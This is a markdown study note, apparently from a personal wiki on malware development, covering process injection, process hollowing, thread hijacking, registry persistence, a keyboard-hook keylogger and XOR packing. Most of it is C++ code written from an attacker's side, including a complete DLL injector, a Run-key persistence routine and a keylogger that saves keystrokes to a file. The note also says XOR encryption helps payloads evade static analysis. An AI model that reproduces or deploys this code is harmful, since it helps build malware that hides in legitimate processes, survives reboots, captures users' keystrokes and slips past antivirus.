# Index 
- [[Malware Development]]
	- [[3. Common Malware Techniques]]
		- [[3.1 Process Injection Techniques]]
		- [[3.2 Persistence Mechanisms]]
		- [[3.3 Hooking Windows APIs]]
		- [[3.4 Packing & Encryption]]

# Process Injection
Process injection is a fundamental technique in malware development that involves injecting malicious code into the address space of another process. This technique is used to hide the malicious process under the guise of a legitimate one and avoid detection by antivirus software.

#### DLL Injection
DLL injection is one of the most common methods of process injection. It involves forcing a target process to load a malicious DLL. The malicious code is then executed within the context of that process.

Steps for DLL Injection:
1. Obtain a handle to the target process using `OpenProcess`.
2. Allocate memory in the target process using `VirtualAllocEx`.
3. Write the path of the DLL to be injected into the allocated memory with `WriteProcessMemory`.
4. Create a remote thread using `CreateRemoteThread` to execute `LoadLibrary` within the target process, which loads the DLL.

DLL Injection Example (C++):
```cpp
#include <windows.h>
#include <iostream>

int main() {
    const char* dllPath = "C:\\path\\to\\your.dll";  // Path to your DLL
    DWORD processID = 1234;  // Target process ID

    // Step 1: Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "Failed to open process." << std::endl;
        return 1;
    }

    // Step 2: Allocate memory in the target process
    LPVOID allocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!allocatedMemory) {
        std::cerr << "Failed to allocate memory in the target process." << std::endl;
        return 1;
    }

    // Step 3: Write the DLL path to the allocated memory
    WriteProcessMemory(hProcess, allocatedMemory, dllPath, strlen(dllPath) + 1, NULL);

    // Step 4: Create a remote thread to load the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, allocatedMemory, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create remote thread." << std::endl;
        return 1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "DLL injected successfully!" << std::endl;
    return 0;
}
```
#### Process Hollowing
Process hollowing involves creating a new process in a suspended state, then replacing the legitimate code with malicious code before resuming the process. This method is commonly used in advanced malware to make it appear as though a legitimate process is running, while in fact, it has been replaced by malware.

Steps for Process Hollowing:
1. Create a suspended process using `CreateProcess`.
2. Unmap the legitimate process image using `NtUnmapViewOfSection`.
3. Allocate new memory for the malicious code using `VirtualAllocEx`.
4. Write the malicious code into the process's address space using `WriteProcessMemory`.
5. Resume the process using `ResumeThread`.

Process Hollowing Example Outline:
```cpp
#include <windows.h>
#include <iostream>

int main() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Step 1: Create a new process in a suspended state
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to create process." << std::endl;
        return 1;
    }

    // Step 2: Unmap the process's memory (legitimate process's code)
    // (Requires use of ntdll.dll functions such as NtUnmapViewOfSection, not shown here for brevity)

    // Step 3: Allocate memory in the target process for the malicious code
    LPVOID maliciousCode = VirtualAllocEx(pi.hProcess, NULL, maliciousCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!maliciousCode) {
        std::cerr << "Failed to allocate memory." << std::endl;
        return 1;
    }

    // Step 4: Write the malicious code into the target process
    WriteProcessMemory(pi.hProcess, maliciousCode, yourMaliciousCode, maliciousCodeSize, NULL);

    // Step 5: Resume the process
    ResumeThread(pi.hThread);

    // Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
```

#### Thread Hijacking
Thread hijacking involves taking control of a legitimate thread in a running process and redirecting its execution flow to malicious code. This can be achieved by suspending a thread, modifying its context to point to malicious code, and then resuming it.

Steps for Thread Hijacking:
1. Open the target process and obtain the thread handle using `OpenThread`.
2. Suspend the thread using `SuspendThread`.
3. Modify the threadâ€™s context (instruction pointer) to point to your malicious code using `SetThreadContext`.
4. Resume the thread using `ResumeThread`.

Thread Hijacking Example Outline:
```cpp
// Pseudocode for thread hijacking
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadID);
SuspendThread(hThread);

CONTEXT context;
context.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &context);

// Modify the instruction pointer (EIP/RIP) to point to malicious code
context.Eip = (DWORD_PTR)maliciousCodeEntryPoint;

SetThreadContext(hThread, &context);
ResumeThread(hThread);
```

# Persistence Mechanisms
Malware often uses persistence mechanisms to survive system reboots or ensure it runs each time the system starts. This can be done through:
- Registry modifications: Add an entry to the registry to automatically launch the malware at startup.
- Scheduled tasks: Schedule the malware to run at regular intervals.
- Service creation: Create a Windows service to ensure that the malware runs in the background.

#### Registry Persistence Example (C++)
```cpp
#include <windows.h>
#include <iostream>

int main() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* malwarePath = "C:\\path\\to\\malware.exe";

    // Step 1: Open the registry key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        // Step 2: Set the value to point to the malware executable
        RegSetValueExA(hKey, "MalwareName", 0, REG_SZ, (const BYTE*)malwarePath, strlen(malwarePath) + 1);

        std::cout << "Persistence added to registry." << std::endl;
    } else {
        std::cerr << "Failed to open registry key." << std::endl;
    }

    RegCloseKey(hKey);
    return 0;
}
```

# Hooking APIs
Hooking is a technique where you intercept calls to specific APIs and either modify their behavior or monitor them for malicious activities. This can be used for keylogging, network traffic monitoring, or to evade detection by AV solutions.

#### Keylogging via API Hooking Example (Outline)
A typical method for keylogging is to hook the `GetAsyncKeyState` or `GetKeyState` function in user-mode, or even lower-level functions using `SetWindowsHookEx`.

```cpp
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = p->vkCode; // Virtual key code of the key pressed

        // Log the key
        std::ofstream logFile("keylog.txt", std::ios::app);
        logFile << char(vkCode);
        logFile.close();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Install the hook
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    // Enter a message loop to keep the hook alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
```

# Packing & Encryption
Packing and encryption are used to hide malicious code from static analysis and signature-based detection. The malware is encrypted or packed using a runtime packer, and then decrypted at runtime.

#### Simple XOR Encryption Example
```cpp
void xorEncryptDecrypt

(char* data, size_t dataSize, const char* key, size_t keySize) {
    for (size_t i = 0; i < dataSize; ++i) {
        data[i] ^= key[i % keySize]; // XOR with the key
    }
}
```
Packing your payload with a custom encryption routine like this helps evade static analysis.